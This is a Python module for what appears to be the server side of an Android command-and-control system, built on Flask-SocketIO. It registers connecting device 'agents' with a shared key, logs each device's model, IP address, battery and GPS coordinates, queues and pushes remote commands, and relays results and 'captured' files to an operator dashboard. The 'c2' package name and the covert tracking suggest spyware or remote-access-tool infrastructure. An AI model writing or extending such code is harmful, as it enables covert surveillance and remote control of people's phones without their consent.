"""WebSocket namespace for persistent agent connections."""

from __future__ import annotations

import json
from datetime import datetime

from flask import request
from flask_socketio import emit, join_room, leave_room

from database import db
from models import Device, Command, CapturedFile, LogEntry
from config import Config
from c2.file_handler import persist_upload
from c2.ws_dashboard import broadcast, socketio


_agents = {}


def register_agent_ws():
    """Attach the /agent namespace handlers. Call once at app startup."""

    @socketio.on("connect", namespace="/agent")
    def on_agent_connect(auth=None):
        # Auth may come via handshake auth or via explicit hello
        a = auth or {}
        key = a.get("api_key", "")
        device_id = a.get("device_id", "")
        if key == Config.API_KEY and device_id:
            _register(device_id, a)
            emit("accept", {"device_id": device_id, "commands": _pending(device_id)})
            return True
        # Otherwise wait for hello
        emit("agent_welcome", {"ok": True})
        return True

    @socketio.on("hello", namespace="/agent")
    def on_agent_hello(data):
        a = data or {}
        if a.get("api_key") != Config.API_KEY:
            emit("reject", {"error": "unauthorized"})
            return False
        device_id = a.get("device_id")
        if not device_id:
            emit("reject", {"error": "missing_device_id"})
            return False
        _register(device_id, a)
        emit("accept", {"device_id": device_id, "commands": _pending(device_id)})

    @socketio.on("state", namespace="/agent")
    def on_agent_state(data):
        device_id = (data or {}).get("device_id")
        if not device_id:
            return
        dev = Device.query.filter_by(device_id=device_id).first()
        if not dev:
            return
        dev.last_seen = datetime.utcnow()
        dev.is_online = True
        if data.get("battery") is not None:
            dev.battery = data["battery"]
        if data.get("latitude") is not None and data.get("longitude") is not None:
            dev.latitude = data["latitude"]
            dev.longitude = data["longitude"]
        db.session.commit()
        broadcast("device_update", dev.to_dict())

    @socketio.on("result", namespace="/agent")
    def on_agent_result(data):
        cmd_id = (data or {}).get("command_id")
        cmd = Command.query.get(cmd_id)
        if not cmd:
            return
        cmd.result = json.dumps(data.get("result", {}))[:1024 * 512]
        cmd.status = "done" if data.get("success") else "failed"
        cmd.completed_at = datetime.utcnow()
        db.session.commit()
        broadcast("command_result", cmd.to_dict())

    @socketio.on("poll", namespace="/agent")
    def on_agent_poll(data):
        device_id = (data or {}).get("device_id")
        if not device_id:
            return
        dev = Device.query.filter_by(device_id=device_id).first()
        if not dev:
            emit("commands", {"commands": []})
            return
        dev.last_seen = datetime.utcnow()
        db.session.commit()
        emit("commands", {"commands": _pending(device_id)})

    @socketio.on("disconnect", namespace="/agent")
    def on_agent_disconnect():
        sid = request.sid
        for did, s in list(_agents.items()):
            if s == sid:
                _agents.pop(did, None)
                dev = Device.query.filter_by(device_id=did).first()
                if dev:
                    dev.is_online = False
                    db.session.commit()
                    broadcast("device_update", dev.to_dict())
                break


def _register(device_id, meta):
    _agents[device_id] = request.sid
    join_room(f"agent_{device_id}")

    dev = Device.query.filter_by(device_id=device_id).first()
    if not dev:
        dev = Device(device_id=device_id)
        db.session.add(dev)

    dev.model = meta.get("model") or dev.model
    dev.manufacturer = meta.get("manufacturer") or dev.manufacturer
    dev.android_version = meta.get("android_version") or dev.android_version
    dev.sdk_int = meta.get("sdk_int") or dev.sdk_int
    dev.hostname = meta.get("hostname") or dev.hostname
    dev.ip_address = request.remote_addr
    dev.last_seen = datetime.utcnow()
    dev.is_online = True
    db.session.commit()

    broadcast("device_update", dev.to_dict())


def _pending(device_id):
    dev = Device.query.filter_by(device_id=device_id).first()
    if not dev:
        return []
    pending = Command.query.filter_by(device_id=dev.id, status="pending")\
                           .limit(20).all()
    for c in pending:
        c.status = "sent"
        c.delivered_at = datetime.utcnow()
    db.session.commit()
    return [
        {"id": c.id, "type": c.command_type, "args": c.args()}
        for c in pending
    ]


def send_command_to_agent(device_id: str, command: dict) -> bool:
    sid = _agents.get(device_id)
    if not sid:
        return False
    socketio.emit("command", command, namespace="/agent", to=sid)
    return True


def agent_online(device_id: str) -> bool:
    return device_id in _agents
